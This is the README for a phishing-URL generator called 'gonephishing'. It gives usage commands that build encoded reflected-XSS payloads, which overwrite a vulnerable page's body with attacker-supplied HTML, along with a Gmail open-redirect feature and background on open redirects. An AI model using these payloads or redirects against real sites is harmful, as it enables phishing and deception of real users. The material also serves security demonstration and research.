# gonephishing


Generate phishing urls for demos and fun (serious security research).

### clone

git clone --recurse-submodules https://github.com/vlp443/gonephishing.git

### Requires

pip3 install htmlmin

### Usage

#### Reflected XSS

 Generate a minified version of an html file and optionally encode it then inject it into some javascript/html.  
 
 the containing javascript must contain a ¬  (shift + backtick in UK) to mark location to inject html into.  
 
 Current supported encoders are b64 (base64), hex ('\xAA\xBB' etc), pcnt (every character as url encoded).  If pcnt encoding isnt selected the string gets a standard urlencode
 
 IE only supports around 2000 characters in a get.


Create a file called test.html (the @ sign below signifies that you are using a file rather than direct input)
~~~
python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'  --encoders b64

python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("¬")</script>'   --encoders hex

python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("¬")</script>'   --encoders b64,hex

python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML="¬"</script>'  --encoders pcnt
~~~
Paste the generated link into the vulnerable request parameter and the page should be overwritten with the supplied html.


#### GMAIL Redirect
OH COOL THEYVE FIXED IT, this now warns you that you are being redirected
~~~
python3 ./gonephishing.py --gmail  --dest https://cutecatsinhats.com/ 
~~~


### About
The OWASP top ten 2013 included A10-Unvalidated Redirects and Forwards with the following description:
Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 

This item does not appear in the top ten 2017

google.com has over 40 unsecured redirects  This is unlikely to change as google do not see it as a vulnerability. https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect


I would expect that the majority of users would trust a site if they were redirected via mail server domain that they were logged into.  This would then cause the user to be more likely to accept a squatted domain of the type described in the quiz below due to the fact that they trust the url via which they were redirected.
 https://phishingquiz.withgoogle.com/



